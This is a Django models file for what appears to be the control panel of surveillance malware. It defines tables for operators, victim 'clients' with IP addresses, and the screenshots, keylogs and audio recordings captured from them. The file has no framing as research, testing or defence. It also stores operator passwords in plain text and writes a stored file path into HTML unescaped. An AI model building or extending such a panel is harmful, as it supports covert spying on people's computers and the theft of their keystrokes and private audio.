from __future__ import unicode_literals
from datetime import datetime
from django.db import models


# Create your models here.
class Moderators(models.Model):

    def __unicode__(self):
        return self.username

    class Meta:
        verbose_name = "Moderator"

    username = models.CharField(max_length=100)
    password = models.CharField(max_length=100)
    privileges = models.IntegerField(default=0, choices=((0, 'Moderator'), (1, 'Administrator')))
    status = models.BooleanField(default=False)
    last_online = models.DateTimeField(default=datetime.now())


class Clients(models.Model):
    moderator_id = models.ForeignKey(Moderators)
    identifier = models.CharField(max_length=100)
    alias = models.CharField(max_length=100, default='')
    note = models.TextField(default='')
    ip_address = models.CharField(max_length=100)
    last_online = models.DateTimeField(default=datetime.now())
    status = models.BooleanField(default=False)

    def __unicode__(self):
        return self.moderator_id.username

    class Meta:
        verbose_name = "Client"


class Screenshots(models.Model):
    client_id = models.ForeignKey(Clients)
    name = models.CharField(max_length=100)
    path = models.CharField(max_length=500)
    title_name = models.CharField(max_length=1000)
    date = models.DateTimeField(default=datetime.now())
    viewed = models.BooleanField(default=False)


class Keylogs(models.Model):
    client_id = models.ForeignKey(Clients)
    path = models.CharField(max_length=500)
    date = models.DateTimeField(default=datetime.now())
    viewed = models.BooleanField(default=False)


class Audios(models.Model):
    client_id = models.ForeignKey(Clients)
    path = models.CharField(max_length=500)
    date = models.DateTimeField(default=datetime.now())
    viewed = models.BooleanField(default=False)

    def spectrum_analyser(self):
        return u'''
    <script src="https://cdnjs.cloudflare.com/ajax/libs/wavesurfer.js/1.2.3/wavesurfer.min.js"></script>
    <script type="text/javascript">
        function init() {{
            var wavesurfer = Object.create(WaveSurfer);
            wavesurfer.init({{
                container: document.querySelector('#{pk}'),
                waveColor: '#34495e',
                progressColor: '#2c3e50',
                height: 50,
                loop: true,
            }});
            wavesurfer.on('ready', function () {{
                wavesurfer.play();
            }});
            wavesurfer.on('finish', function () {{
                wavesurfer.play();
            }});
            wavesurfer.load('{audiopath}');
            }}
        window.onload = init;
    </script>
    <div id="{pk}" style="width:500px;"></div>
    '''.format(pk=self.pk, audiopath=self.path)

    spectrum_analyser.allow_tags = True
